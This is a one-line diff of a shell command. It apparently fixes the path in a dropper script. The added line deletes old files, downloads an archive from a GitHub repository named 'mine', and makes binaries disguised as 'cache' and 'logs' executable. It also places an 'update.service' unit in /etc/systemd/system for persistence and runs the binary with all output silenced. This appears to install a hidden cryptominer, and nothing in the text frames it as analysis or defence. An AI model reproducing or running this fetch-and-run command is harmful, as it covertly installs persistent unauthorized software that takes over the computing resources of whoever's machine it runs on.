@@ -1,1 +1,1 @@
-rm -rf oc.tar cache logs && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/oc.tar && tar xf oc.tar && chmod +x cache logs && cd /etc/systemd/system/ && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update.service && ./etc/logs > /dev/null 2>&1
+rm -rf oc.tar cache logs && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/oc.tar && tar xf oc.tar && chmod +x cache logs && cd /etc/systemd/system/ && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update.service && ./logs > /dev/null 2>&1
